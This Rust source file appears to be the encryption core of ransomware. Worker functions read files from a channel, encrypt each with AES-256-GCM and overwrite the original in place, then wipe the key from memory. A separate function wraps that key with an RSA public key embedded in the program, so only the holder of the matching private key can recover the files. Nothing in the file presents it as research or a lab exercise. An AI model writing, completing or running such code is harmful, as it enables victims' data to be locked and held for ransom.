use std::fs::DirEntry;
use std::fs::{read, write};

use crossbeam_channel::Receiver;
use openssl::rand::rand_bytes;
use openssl::rsa;
use openssl::symm::{encrypt, Cipher};
use tracing::{event, Level};
use zeroize::Zeroize;

use crate::PUB_KEY;

/// generates a key using `openssl::rand::rand_bytes()` method
pub(crate) fn generate_key() -> Vec<u8> {
    let mut key = vec![0_u8; 32];
    rand_bytes(&mut key).unwrap();
    key
}

/// encrypts files from the `r` reciever using the provided `key`. Exits when it runs out of files to encrypt.
pub(crate) async fn encrypt_files(r: Receiver<DirEntry>, mut key: Vec<u8>) {
    event!(Level::DEBUG, "Encryption worker started.");
    while !r.is_empty() {
        if let Ok(file) = r.recv() {
            event!(Level::DEBUG, "Processing file: {:?}", file);
            let content = read(file.path());
            if content.is_err() {
                continue;
            }
            let mut iv = generate_key();

            if let Ok(mut output) = encrypt(
                Cipher::aes_256_gcm(),
                &key,
                Some(&iv),
                content.as_ref().unwrap(),
            ) {
                output.append(&mut iv);
                let _ = write(file.path(), &output);
                output.zeroize();
            }
            content.unwrap().zeroize();
        }
    }
    event!(
        Level::DEBUG,
        "Channel is empty, zeroing memory and killing worker."
    );
    key.zeroize();
}

/// wraps a key using the embedded `PUB_KEY` value
#[allow(clippy::ptr_arg)]
pub(crate) fn wrap_key(key: &Vec<u8>) -> Vec<u8> {
    // import key
    let rsa_key = rsa::Rsa::public_key_from_pem(PUB_KEY).unwrap();
    let p_key = openssl::pkey::PKey::from_rsa(rsa_key).unwrap();

    // find output size and pre-allocate buffer
    let encryptor = openssl::encrypt::Encrypter::new(&p_key).unwrap();
    let buffer_len = encryptor.encrypt_len(key).unwrap();
    let mut encrypted = vec![0u8; buffer_len];

    // Encrypt the data and discard its length. Return buffer.
    let _ = encryptor.encrypt(key, &mut encrypted).unwrap();
    encrypted
}
